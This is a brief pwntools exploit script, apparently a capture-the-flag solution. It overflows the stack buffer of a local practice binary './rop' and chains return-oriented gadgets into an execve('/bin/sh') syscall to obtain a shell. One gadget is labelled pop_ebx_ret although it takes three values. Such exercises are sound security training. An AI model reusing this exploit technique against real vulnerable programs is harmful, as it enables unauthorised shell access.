from pwn import *

p=process('./rop')

int_0x80=0x8049421

bin_sh_addr=0x80be408

pop_eax_ret=0x80bb196
pop_ebx_ret=0x806eb90

payload= b'A'*(0x6c+4)+p32(pop_eax_ret)+p32(0xb)+p32(pop_ebx_ret)+p32(0)+p32(0)+p32(bin_sh_addr)+p32(int_0x80)

p.sendline(payload)
p.interactive()

